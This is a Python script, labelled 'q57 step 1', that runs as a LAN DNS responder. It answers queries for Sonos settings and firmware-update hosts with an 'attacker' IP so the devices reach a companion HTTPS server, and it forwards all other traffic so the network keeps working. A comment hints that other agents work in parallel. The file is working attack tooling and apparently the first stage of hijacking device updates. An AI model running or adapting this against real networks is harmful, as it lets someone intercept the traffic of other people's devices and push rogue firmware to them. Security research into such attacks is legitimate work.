#!/usr/bin/env python3
"""q57 step 1: minimal LAN DNS responder.

Answers A queries for the Sonos cloud hosts with the attacker host IP
(the machine running q57_https_server.py). Everything else: forward to the
upstream resolver (default: the LAN router), so the rest of the network
keeps working while this runs.

Listens on 0.0.0.0:53 (needs root) or a high port with iptables/pf redirect.

Covered names (from RE_UPDATER.md: the settings fetch is TLS to
system-api.sonos.com / system-api-pos.sonos.com; the firmware fetch host is
update-firmware.sonos.com; manifest host update.sonos.com):

  system-api.sonos.com
  system-api-pos.sonos.com
  system-api.prod.sonos.com
  update-firmware.sonos.com
  update.sonos.com

Usage: sudo python3 q57_dns.py <attacker-ip> [port]
"""
import socket
import struct
import sys
import threading

NAMES = {
    "system-api.sonos.com",
    "system-api-pos.sonos.com",
    "system-api.prod.sonos.com",
    "update-firmware.sonos.com",
    "update.sonos.com",
}

def forward(data, upstream):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    try:
        s.sendto(data, (upstream, 53))
        resp, _ = s.recvfrom(4096)
        return resp
    except Exception:
        return None
    finally:
        s.close()


def handle(data, addr, sock, attacker_ip, upstream):
    if len(data) < 12:
        return
    tid = data[:2]
    flags = struct.unpack(">H", data[2:4])[0]
    is_query = (flags & 0x8000) == 0
    qdcount = struct.unpack(">H", data[4:6])[0]
    if not is_query or qdcount != 1:
        r = forward(data, upstream)
        if r:
            sock.sendto(r, addr)
        return
    # parse the single question
    i = 12
    labels = []
    while True:
        l = data[i]
        if l == 0:
            i += 1
            break
        labels.append(data[i + 1:i + 1 + l].decode(errors="replace"))
        i += 1 + l
    qtype, qclass = struct.unpack(">HH", data[i:i + 4])
    i += 4
    name = ".".join(labels).lower()
    hdr = b""
    if qtype == 1 and name in NAMES:  # A
        hdr = tid + struct.pack(">HHHHH", 0x8180, 1, 1, 0, 0)
        question = data[12:i]
        answer = b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 30, 4) + socket.inet_aton(attacker_ip)
        sock.sendto(hdr + question + answer, addr)
        with open("/tmp/q57-serve/dns.log", "a") as f:
            f.write("A %s -> %s from %s\n" % (name, attacker_ip, addr[0]))
    else:
        r = forward(data, upstream)
        if r:
            sock.sendto(r, addr)
        else:
            hdr = tid + struct.pack(">HHHHH", 0x8183, 0, 0, 0, 0)
            sock.sendto(hdr + data[12:i], addr)
            with open("/tmp/q57-serve/dns.log", "a") as f:
                f.write("FWD-FAIL %s from %s\n" % (name, addr[0]))


def main():
    if len(sys.argv) < 2:
        print("usage: q57_dns.py <attacker-ip> [port] [upstream]")
        sys.exit(1)
    attacker_ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 53
    upstream = sys.argv[3] if len(sys.argv) > 3 else "192.168.4.1"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # bind the SPECIFIC address: another agent's forwarder already holds 0.0.0.0:53 / .160:53
    sock.bind((attacker_ip, port))
    print("q57 dns on :%d, answering %d names -> %s, upstream %s"
          % (port, len(NAMES), attacker_ip, upstream))
    while True:
        data, addr = sock.recvfrom(4096)
        threading.Thread(target=handle, args=(data, addr, sock, attacker_ip, upstream), daemon=True).start()


if __name__ == "__main__":
    main()
